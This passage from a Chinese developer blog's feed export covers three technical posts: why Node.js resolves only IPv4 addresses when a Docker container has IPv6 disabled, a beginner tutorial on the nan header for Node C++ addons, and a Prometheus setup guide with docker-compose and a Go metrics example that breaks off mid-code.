<p><strong>代码 1.2 http 请求测试</strong></p>
<p>没有想到 <strong>代码 1.2</strong> 执行完成后竟然只做了 ipv4 的解析：</p>
<pre class="line-numbers language-none"><code class="language-none">21:01:06.593429 IP 10.6.12.158.48479 &gt; 10.7.11.219.domain: 10352+ A? baidu.com. (27)
21:01:06.596978 IP 10.7.11.219.domain &gt; 10.6.12.158.48479: 10352 2&#x2F;0&#x2F;0 A 39.156.69.79, A 220.181.38.148 (59)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这就很神奇了，node 的 http 的代码封装中肯定做了什么！带着这个疑问，我阅读了 node 的源码，首先看 ClientRequest 的初始化代码中，连接初始化部分：</p>
<p><img src="/images/image-20210909150643988.png" alt="image-20210909150643988"></p>
<p><strong>代码 1.3 <a href="https://sourcegraph.com/github.com/nodejs/node/-/blob/lib/_http_client.js#L274">ClientRequest 类的连接初始化</a></strong></p>
<p>http.request 没有加任何参数的情况，默认走到 <code>this.onSocket(net.createConnection(options));</code> 这句话，然后看 net 包的代码，其中一端跟 DNS 相关的代码：</p>
<p><img src="/images/image-20210909145827042.png" alt="image-20210909145827042"></p>
<p><strong>代码 1.4 <a href="https://sourcegraph.com/github.com/nodejs/node/-/blob/lib/net.js#L1010">net 包中 DNS 查询参数代码</a></strong></p>
<p>然后我们再看 lookup 函数的源码：</p>
<p><img src="/images/image-20210909145948090.png" alt="image-20210909145948090"></p>
<p><strong>代码 1.5 <a href="https://sourcegraph.com/github.com/nodejs/node/-/blob/lib/dns.js#L88">lookup 函数源码</a></strong></p>
<p>通过代码 1.5 发现最终 DNS 查询是要调用 C++ 绑定类的，于是我又查看了 C++ 的代码：</p>
<p><img src="/images/image-20210909150206942.png" alt="image-20210909150206942"></p>
<p><strong>代码 1.6 <a href="https://sourcegraph.com/github.com/nodejs/node/-/blob/src/cares_wrap.cc#L1940">C++ 中 DNS 的查询代码</a></strong></p>
<p>注意 <strong>代码 1.5</strong> 中的 family hints 最终会分别转化为 结构体变量 struct addrinfo hints 中的 ai_family 和 ai_flags。</p>
<p>最终这个结构体 hints 会层层传递到 libuv 中：</p>
<p><img src="/images/image-20210909150312046.png" alt="image-20210909150312046"></p>
<p><strong>代码 1.7 <a href="https://sourcegraph.com/github.com/nodejs/node@c5f5f84a33967862036c7d87f4bbde6a59d3820a/-/blob/deps/uv/src/unix/getaddrinfo.c#L101">libuv 中的 dns 查询函数代码</a></strong></p>
<p>注意到我们在 <strong>代码 1.4</strong> 中的 hints 参数，最终会作为 req-&gt;hints-&gt;ai_flags 参数，最终我在 man7 文档上找到了 <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">AI_ADDRCONFIG</a>  的这个参数的说明：</p>
<pre class="line-numbers language-none"><code class="language-none">If hints.ai_flags includes the AI_ADDRCONFIG flag, then IPv4
addresses are returned in the list pointed to by res only if the
local system has at least one IPv4 address configured, and IPv6
addresses are returned only if the local system has at least one IPv6
address configured.  The loopback address is not considered for this
case as valid as a configured address.  This flag is useful on, for
example, IPv4-only systems, to ensure that getaddrinfo() does not
return IPv6 socket addresses that would always fail in connect(2) or
bind(2).<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大体意思是说，系统配置了 ipv4 才返回 ipv4的地址，系统配置了 ipv6 才返回 ipv6 的地址，而 docker 的启动参数 <code>--sysctl net.ipv6.conf.all.disable_ipv6=1</code> 等同于系统只支持 ipv4 的声明，所以操作系统函数 <code>getaddrinfo</code> 就只返回 ipv4 的地址。</p>
<p>重新验证这个问题，将代码 1.1 做改造：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> dns <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'dns'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> domain <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'baidu.com'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> begin <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dns<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>domain<span class="token punctuation">,</span><span class="token punctuation">&#123;</span>hints<span class="token operator">:</span><span class="token number">32</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err <span class="token punctuation">,</span>address <span class="token punctuation">,</span> family</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'耗时'</span><span class="token punctuation">,</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> begin<span class="token punctuation">,</span> err <span class="token punctuation">,</span>address <span class="token punctuation">,</span> family<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.8 使用 ADDRCONFIG 参数做 DNS 查询</strong></p>
<blockquote>
<p>这里面之所以取值的 hints:32，是因为 <code>AI_ADDRCONFIG</code> 的值为32。通过设置环境变量 NODE_DEBUG&#x3D;net 后启动 <strong>代码1.2</strong> ，会发现 <code>debug(&#39;connect: dns options&#39;, dnsopts);</code> 打印的 hints 值为 32。</p>
</blockquote>
<p>重新运行，发现果然只查询了 ipv4 的地址。</p>
<p>到此为止，其实可以算是圆满收官了，但是对于 request 包还是不死心，心想如果当前开源源码不支持，是否可以做一个 pull request  呢，于是我看了一下他们的官方源码，结果就发现了新大陆：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> reqOptions <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span>
<span class="token keyword">delete</span> reqOptions<span class="token punctuation">.</span>auth

<span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">'make request'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>uri<span class="token punctuation">.</span>href<span class="token punctuation">)</span>

<span class="token comment">// node v6.8.0 now supports a `timeout` value in `http.request()`, but we</span>
<span class="token comment">// should delete it for now since we handle timeouts manually for better</span>
<span class="token comment">// consistency with node versions before v6.8.0</span>
<span class="token keyword">delete</span> reqOptions<span class="token punctuation">.</span>timeout

<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
  self<span class="token punctuation">.</span>req <span class="token operator">=</span> self<span class="token punctuation">.</span>httpModule<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>reqOptions<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  self<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.9 request 源码片段</strong></p>
<p><code>self.httpModule.request(reqOptions)</code> 等同于 <code>http.request(reqOptions)</code> 或者 <code>https.request(reqOptions)</code>，也就是说 http 模块的所有参数其实在 request 上也是适用的，但是 request 的官方文档却没有指出！</p>
<p>最圆满的方案出炉了，在调用 request 函数的时候，指定 family 为 4，也可以通过 node 代码层面屏蔽 ipv6 解析。不过鉴于启动 docker 时已经添加 <code>sysctl</code> 参数，即使 node 不指定使用  ipv4，请求 http 也会只返回 ipv4 的地址。</p>
]]></content>
      <categories>
        <category>Node</category>
      </categories>
  </entry>
  <entry>
    <title>nan入门教程</title>
    <url>/posts/nan/</url>
    <content><![CDATA[<p>Node.js在升级到0.12后，c++ API部分发生了翻天覆地的变化，如果你之前的代码是按照0.10的API编写的，将其改成0.12的形式是需要耗费一番精力的，但是问题又来了，你如果改为0.12形式，0.10又不能够被兼容了。幸好有<a href="https://github.com/nodejs/nan">nan</a>，其实它的核心是一个头文件，通过宏定义来做不同版本的node的c++ API的兼容。</p>
<h2 id="1-配置"><a href="#1-配置" class="headerlink" title="1.配置"></a>1.配置</h2><p>首先你通过 <code>npm install nan --save</code> 来安装 nan ,然后在binding.gyp中配置：</p>
<pre><code>&quot;include_dirs&quot; : [
    &quot;&lt;!(node -e \&quot;require(&#39;nan&#39;)\&quot;)&quot;
]
</code></pre>
<p> 最后在使用<code>nan</code>的c++文件中引入头文件<code>#include&lt;nan.h&gt;</code>。</p>
<h2 id="2-demo"><a href="#2-demo" class="headerlink" title="2.demo"></a>2.demo</h2><p> 下面的demo摘自nan的readme文档</p>
<pre><code> // addon.cc
#include &lt;node.h&gt;
#include &lt;nan.h&gt;
// ..引入async.h或者sync.h

using v8::FunctionTemplate;
using v8::Handle;
using v8::Object;
using v8::String;

void InitAll(Handle&lt;Object&gt; exports) &#123;
  exports-&gt;Set(NanNew&lt;String&gt;(&quot;calculateSync&quot;),
    NanNew&lt;FunctionTemplate&gt;(CalculateSync)-&gt;GetFunction());

  exports-&gt;Set(NanNew&lt;String&gt;(&quot;calculateAsync&quot;),
    NanNew&lt;FunctionTemplate&gt;(CalculateAsync)-&gt;GetFunction());
&#125;

NODE_MODULE(addon, InitAll)   
</code></pre>
<p><strong>代码2.1 addon.cc</strong></p>
<p>首先就是导出函数部分，<code>nan</code>中写法为<code>exports-&gt;Set(NanNew&lt;String&gt;(&quot;calculateSync&quot;),         NanNew&lt;FunctionTemplate&gt;(CalculateSync)-&gt;GetFunction());</code>，对于c++ api来说，在nan中全部都要用<code>NanNew</code>来声明，在0.10中这句话被写作<code>exports-&gt;Set(String::NewSymbol(&quot;calculateSync&quot;),FunctionTemplate::New(CalculateAsync)-&gt;GetFunction());</code>在0.12中是<code>NODE_SET_METHOD(exports, &quot;calculateSync&quot;, CalculateAsync); </code>。<br> 正常情况下需要引入函数<code>CalculateAsync</code>所在的头文件的，但是官方文档给出了两个<code>CalculateAsync</code>函数的实现，一个同步版，一个异步版。同步版仅仅是直接调用：</p>
<pre><code>// sync.h
#include &lt;node.h&gt;
#include &lt;nan.h&gt;

NAN_METHOD(CalculateSync);
</code></pre>
<p><strong>代码2.2 sync.h</strong></p>
<p>通过头文件就可以看出，函数声明的方式需要使用<code>NAN_METHOD(CalculateSync)</code>，这等同于0.10中的<code>Handle&lt;Value&gt; CalculateSync(const Arguments&amp; args)</code>,在0.12中要这么写<code>void CalculateSync(const FunctionCallbackInfo&lt;Value&gt;&amp; args)</code>。</p>
<pre><code>// sync.cc
#include &lt;node.h&gt;
#include &lt;nan.h&gt;
#include &quot;./sync.h&quot;
// ...引入第三方类库头文件

using v8::Number;

// Simple synchronous access to the `Estimate()` function
NAN_METHOD(CalculateSync) &#123;
  NanScope();

  // expect a number as the first argument
  int points = args[0]-&gt;Uint32Value();
  double est = Estimate(points);//Estimate是一个第三方类库的函数，这里可以不用理会

  NanReturnValue(NanNew&lt;Number&gt;(est));
&#125;
</code></pre>
<p><strong>代码2.3 sync.cc</strong><br>首先是函数<code>NanScope();</code>,他来完成node0.10中的<code>HandleScope scope;</code>的功能，在node0.12中是：</p>
<pre><code>Isolate* isolate = Isolate::GetCurrent();
HandleScope scope(isolate);
</code></pre>
<p>函数结束返回值操作也变成由函数（确切的说应该是宏定义）NanReturnValue来代替。</p>
<p>更令人振奋的是，nan中还对libuv中的函数<code>uv_queue_work</code>进行了抽象，可以通过继承类<code>NanAsyncWorker</code>来实现异步话操作，省去了为了使用<code>uv_queue_work</code>而自定义数据结构的步骤。下面就是async.cc的代码：</p>
<pre><code>// async.cc
#include &lt;node.h&gt;
#include &lt;nan.h&gt;
#include &quot;./async.h&quot;

// ...引入第三方类库

using v8::Function;
using v8::Local;
using v8::Null;
using v8::Number;
using v8::Value;

class PiWorker : public NanAsyncWorker &#123;
 public:
  PiWorker(NanCallback *callback, int points)
    : NanAsyncWorker(callback), points(points) &#123;&#125;
  ~PiWorker() &#123;&#125;

  //这个函数运行在工作线程，而不是v8线程，所以不能访问v8的数据
  void Execute () &#123;
    estimate = Estimate(points);
  &#125;

  //这个是libuv的回调函数，在这里可以使用v8的数据
  void HandleOKCallback () &#123;
    NanScope();

    Local&lt;Value&gt; argv[] = &#123;
        NanNull()
      , NanNew&lt;Number&gt;(estimate)
    &#125;;

    callback-&gt;Call(2, argv);
  &#125;;

 private:
  int points;
  double estimate;
&#125;;

// Asynchronous access to the `Estimate()` function
NAN_METHOD(CalculateAsync) &#123;
  NanScope();

  int points = args[0]-&gt;Uint32Value();
  NanCallback *callback = new NanCallback(args[1].As&lt;Function&gt;());

  NanAsyncQueueWorker(new PiWorker(callback, points));
  NanReturnUndefined();
&#125;
</code></pre>
<p><strong>代码2.4 async.cc</strong><br><a href="https://gitlab.com/yunnysunny/async-tutorial-code/tree/master/addon">这里</a>有一个利用<a href="https://github.com/nodejs/nan">nan</a>和node0.10&#x2F;0.12来完成异步操作的对比。</p>
<p>这篇教程仅仅是一个入门操作，就讲到这里了，详细的使用请参考nan的readme文档。</p>
]]></content>
      <categories>
        <category>Node</category>
      </categories>
  </entry>
  <entry>
    <title>prometheus 启航</title>
    <url>/posts/prometheus-startup/</url>
    <content><![CDATA[<p>在服务运行的整个生命周期内，为了尽早的发现服务内部的潜在问题，我们需要对于服务运行过程中产生的数据进行监控，并提取其关键指标，并在某项指标产生异常时触发报警。<br>我们熟知的监控系统，除了本文讲到的 prometheus 外，还有 zabbix。zabbix 跟 prometheus 的最大区别是，需要被监控方主动上报自己的数据给数据收集者；而 prometheus 需要程序的编写者自己暴漏 HTTP 接口，然后由数据采集者自己来做数据拉取。prometheus 采用这种主动拉取的策略，便可以从容的在数据采集端来控制数据采集的频率，一旦想做修改某个指标的频率只需要在采集端做一次修改，换成使用 zabbix 的话，需要修改每个上报端的程序配置才能完成。</p>
<p>加之，Prometheus 的社区中提供了各种数据暴漏的插件程序（在 Prometheus 体系中，它们被称之为 exporter），大大减轻了程序编写成本。很多常见的数据库或者中间件程序，都有编写好的 exporter 程序，可以使用，例如 Mysql Mongodb Redis Kafka Nginx 等都有成熟的 exporter 可以使用。</p>
<blockquote>
<p>具体可以参见官方的 exporter 文档 <a href="https://prometheus.io/docs/instrumenting/exporters/">https://prometheus.io/docs/instrumenting/exporters/</a></p>
</blockquote>
<p>Prometheus 还有一个重大的特性，是其收集的数据有固定的数据结构，而这些数据结构可以通过自带的 <a href="https://prometheus.io/docs/prometheus/latest/querying/basics/">PromQL</a> 语句进行查询，返回聚合后的数据，更可以将 PromQL 和 grafana 结合，显示成报表视图。</p>
<blockquote>
<p>由于 PromQL 比较复杂，本篇教程并不会过多涉及。</p>
</blockquote>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>这里使用 docker-compose 来构建一个测试用的 Prometheus 环境</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3"</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">alertmanager</span><span class="token punctuation">:</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">image</span><span class="token punctuation">:</span> prom/alertmanager
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'9093:9093'</span>
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./alertmanager<span class="token punctuation">:</span>/etc/alertmanager
  <span class="token key atrule">prometheus</span><span class="token punctuation">:</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">user</span><span class="token punctuation">:</span> root
    <span class="token key atrule">image</span><span class="token punctuation">:</span> bitnami/prometheus
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> prometheus<span class="token punctuation">-</span>dev
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'9090:9090'</span>
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./prometheus<span class="token punctuation">:</span>/opt/bitnami/prometheus/conf
      <span class="token punctuation">-</span> /tmp/prometheus<span class="token punctuation">-</span>persistence<span class="token punctuation">:</span>/opt/bitnami/prometheus/data
    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> alertmanager
  <span class="token key atrule">grafna</span><span class="token punctuation">:</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">image</span><span class="token punctuation">:</span> grafana/grafana
    <span class="token key atrule">user</span><span class="token punctuation">:</span> root
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> /tmp/grafana<span class="token punctuation">-</span>persistence<span class="token punctuation">:</span>/var/lib/grafana
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">'3000:3000'</span>
    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
       <span class="token key atrule">GF_SECURITY_ADMIN_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"secret"</span>
    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> prometheus<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1 docker-compose.yml</strong></p>
<p>在上述代码中，通过 <code>volumes</code> 属性指定了一个外挂的目录，Prometheus 默认从 <code>/opt/bitnami/prometheus/conf/prometheus.yml</code> 路径下加载配置，这里我们在 <code>docker-compose.yml</code> 文件所在目录下，创建一个 <code>prometheus</code> 目录做映射到 <code>/opt/bitnami/prometheus/conf</code> 目录，这样修改配置文件时，就只需要在宿主机上做修改即可，不需要进入 docker 内部。下面是 <code>prometheus</code> 目录下的 <code>prometheus.yml</code> 的配置内容</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># my global config</span>
<span class="token key atrule">global</span><span class="token punctuation">:</span>
  <span class="token key atrule">scrape_interval</span><span class="token punctuation">:</span>     15s <span class="token comment"># Set the scrape interval to every 15 seconds. Default is every 1 minute.</span>
  <span class="token key atrule">evaluation_interval</span><span class="token punctuation">:</span> 15s <span class="token comment"># Evaluate rules every 15 seconds. The default is every 1 minute.</span>
  <span class="token comment"># scrape_timeout is set to the global default (10s).</span>
<span class="token comment"># Alertmanager configuration</span>
<span class="token key atrule">alerting</span><span class="token punctuation">:</span>
  <span class="token key atrule">alertmanagers</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> <span class="token key atrule">static_configs</span><span class="token punctuation">:</span>
    <span class="token punctuation">-</span> <span class="token key atrule">targets</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> alertmanager<span class="token punctuation">:</span><span class="token number">9094</span>
<span class="token comment"># A scrape configuration containing exactly one endpoint to scrape:</span>
<span class="token comment"># Here it's Prometheus itself.</span>
<span class="token key atrule">scrape_configs</span><span class="token punctuation">:</span>
  <span class="token comment"># The job name is added as a label `job=&lt;job_name>` to any timeseries scraped from this config.</span>
  <span class="token punctuation">-</span> <span class="token key atrule">job_name</span><span class="token punctuation">:</span> <span class="token string">'prometheus'</span>

    <span class="token comment"># metrics_path defaults to '/metrics'</span>
    <span class="token comment"># scheme defaults to 'http'.</span>

    <span class="token key atrule">static_configs</span><span class="token punctuation">:</span>
    <span class="token punctuation">-</span> <span class="token key atrule">targets</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'localhost:9090'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2 prometheus.yml</strong></p>
<img src="/images/image-20220125153623368.png" alt="image-20220125153623368" style="zoom: 33%;" />

<p> <strong>图 1.1</strong></p>
<p>在浏览器中打开 localhost:9090，如果能显示上图界面，代表配置成功。</p>
<p>这里主要讲一下 <strong>代码 1.2</strong> 中的 <code>scrape_config</code> 属性。它里面配置的内容，就是我们前面中提到的各种 exporter，Prometheus 本身也提供了一个 exporter 采集地址，访问 <a href="http://localhost:9090/metrics">http://localhost:9090/metrics</a> 即可看到返回的采集数据。这里摘取返回的头部几行数据展示如下：</p>
<pre class="line-numbers language-none"><code class="language-none"># HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
# TYPE go_gc_duration_seconds summary
go_gc_duration_seconds&#123;quantile&#x3D;&quot;0&quot;&#125; 1.95e-05
go_gc_duration_seconds&#123;quantile&#x3D;&quot;0.25&quot;&#125; 5.42e-05
go_gc_duration_seconds&#123;quantile&#x3D;&quot;0.5&quot;&#125; 0.0001787
go_gc_duration_seconds&#123;quantile&#x3D;&quot;0.75&quot;&#125; 0.0002019
go_gc_duration_seconds&#123;quantile&#x3D;&quot;1&quot;&#125; 0.0003965
go_gc_duration_seconds_sum 0.0008508
go_gc_duration_seconds_count 5
# HELP go_goroutines Number of goroutines that currently exist.
# TYPE go_goroutines gauge
go_goroutines 35
# HELP go_info Information about the Go environment.
# TYPE go_info gauge
go_info&#123;version&#x3D;&quot;go1.17.5&quot;&#125; 1
# ......此处省略若干条记录......
# HELP promhttp_metric_handler_requests_total Total number of scrapes by HTTP status code.
# TYPE promhttp_metric_handler_requests_total counter
promhttp_metric_handler_requests_total&#123;code&#x3D;&quot;200&quot;&#125; 543
promhttp_metric_handler_requests_total&#123;code&#x3D;&quot;500&quot;&#125; 0
promhttp_metric_handler_requests_total&#123;code&#x3D;&quot;503&quot;&#125; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3</strong></p>
<h2 id="2-数据指标-metric"><a href="#2-数据指标-metric" class="headerlink" title="2. 数据指标(metric)"></a>2. 数据指标(metric)</h2><p><strong>代码 1.3</strong> 中给出了一个示例，Prometheus 拉取回的数据，就是上述这种格式的。我们对这种格式，做一个抽象定义的话，就是如下形式</p>
<pre class="line-numbers language-none"><code class="language-none">metric_name&#123;label_name1&#x3D;label_value1, ...&#125; float_value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>以空格为分割，前半部分就是指标，后半部分就是指标的值。指标又分为指标名称和指标标签，大括号内容中的内容就是一个个指标标签，可以理解为对于当前指标的各种属性描述信息；指标名称就是大括号前的 <code>metric_name</code>，可以在后续的所有查询操作中，都需要根据这个名字作为检索依据。</p>
<p>我们打开 <a href="http://localhost:9090/graph">http://localhost:9090/graph</a> ，在其中搜索框中输入</p>
<p> <code>promhttp_metric_handler_requests_total</code> </p>
<p>后回车，会显示出来当前不同 HTTP 请求响应码的个数统计：</p>
<p><img src="/images/image-20220216094717415.png" alt="image-20220216094717415"></p>
<p><strong>图 2.1</strong></p>
<p>当然你也可以在检索中通过标签值来做过滤，比如说你只想看请求响应码为 200 的数据。输入 </p>
<p><code>promhttp_metric_handler_requests_total&#123;code=&quot;200&quot;&#125;</code> </p>
<p>后回车，会显示如下数据：</p>
<p><img src="/images/image-20220216095022954.png" alt="image-20220216095022954"></p>
<p><strong>图 2.2</strong></p>
<p>上面举的两个例子返回的都是当前最新时刻的数据，如果我们想查看最近一段时间的数据，可以加一个 duration，</p>
<pre class="line-numbers language-none"><code class="language-none">metric_name&#123;label_name1&#x3D;label_value1, ...&#125;[duration]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>例如我们要显示最近 1 分钟内所有的 <code>promhttp_metric_handler_requests_total</code> 指标，可以输入 <code>promhttp_metric_handler_requests_total[1m]</code>：</p>
<p><img src="/images/image-20220216144951153.png" alt="image-20220216144951153"></p>
<p><strong>图 2.3</strong></p>
<p>由于要返回一段时间内的多条数据，所以每个数据的值后面又标识上了时间戳，比如说第一行数据 <code>1229 @ 164994057.686</code> 代表在时间戳 164994057.686 搜刮上来的 HTTP 响应码为 200 的请求计数为 1229 个。将第二行的时间戳和第一行的时间戳相减，即 <code>1644988807.686 - 1644988822.686</code>, 得到的值为 15，代表当前 Prometheus 搜刮 <a href="http://localhost:9090/metrics">http://localhost:9090/metrics</a> 的时间间隔为 15s，这个时间间隔也是 Prometheus 的默认值。</p>
<p>通过上面的例子可以推断出来，Prometheus 不仅仅存储了当前指标的最新值，并且还存储了历史值，这样通过一段时间的历史数据，就给指标的变化曲线的绘制操作提供了数据支持。</p>
<p>Prometheus 每次进行搜刮的时候，都会将搜刮到的各种指标添加一个时间戳字段，然后存储到本地。如下图所示，图中的每个圆点代表搜刮的来的指标内容。一个个的小圆点组成了一个类似矩阵的结构，矩阵的每一行都是具体某个指标在各个时间点上的取值；矩阵的每一列的时间戳属性都是同一个值。列与列之间的间隔就是 Prometheus 的搜刮的时间间隔。</p>
<p><img src="/images/prometheus_time_series.drawio.png"></p>
<p><strong>图 2.4</strong></p>
<p>Prometheus 对于 <strong>图 2.1</strong> 中的查询语句，叫做瞬时向量查询（Instant vector selectors），但是它返回的仅仅是命中查询语句的所有指标的最新值。比如 <strong>图 2.1</strong> 中一共命中了三个指标，但是均返回每个指标的最新值。<strong>图 2.2</strong> 中增加了对于 label 的限定，它返回的依然是查询到每个指标的最新值，也就是说它也归属于瞬时向量的范畴。</p>
<blockquote>
<p>从数学意义上讲，它更像是点，而不是向量，虽然数学中可以允许只有一个点的向量存在。</p>
</blockquote>
<p>Prometheus 对于 <strong>图 2.3</strong> 中的查询语句，叫做区间向量查询（Range Vector Selectors），它跟瞬时向量不同的是，它能返回多个点，确切的说是从当前时刻往前推 duration 时间段内的多个点（对于 <strong>图 2.3</strong> 来说，duration 为 1分钟）。类似于 <strong>图 2.2</strong> ，你可以可以对 <strong>图 2.3</strong> 中的查询添加 label 限定。</p>
<p>同时留意到我们在 <strong>图 2.1</strong> 使用的指标 <code>promhttp_metric_handler_requests_total</code> 在 Prometheus 中属于计数器（Counter）类型，它只能单调递增，我们一般用其来进行计数，比如说记录某个接口的请求次数。</p>
<p><img src="/images/image-20220218134052626.png" alt="image-20220218134052626"></p>
<p><strong>图 2.5</strong></p>
<p>下面是一个使用 go 语言来暴漏计时器数据的代码示例：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"time"</span>

	<span class="token string">"github.com/prometheus/client_golang/prometheus"</span>
	<span class="token string">"github.com/prometheus/client_golang/prometheus/promauto"</span>
	<span class="token string">"github.com/prometheus/client_golang/prometheus/promhttp"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">recordMetrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">&#123;</span>
			opsProcessed<span class="token punctuation">.</span><span class="token function">Inc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> <span class="token punctuation">(</span>
	opsProcessed <span class="token operator">=</span> promauto<span class="token punctuation">.</span><span class="token function">NewCounter</span><span class="token punctuation">(</span>prometheus<span class="token punctuation">.</span>CounterOpts<span class="token punctuation">&#123;</span>
		Name<span class="token punctuation">:</span> <span class="token string">"myapp_processed_ops_total"</span><span class="token punctuation">,</span>
		Help<span class="token punctuation">:</span> <span class="token string">"The total number of processed events"</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">recordMetrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/metrics"</span><span class="token punctuation">,</span> promhttp<span class="token punctuation">.</span><span class="token function">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":2112"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>
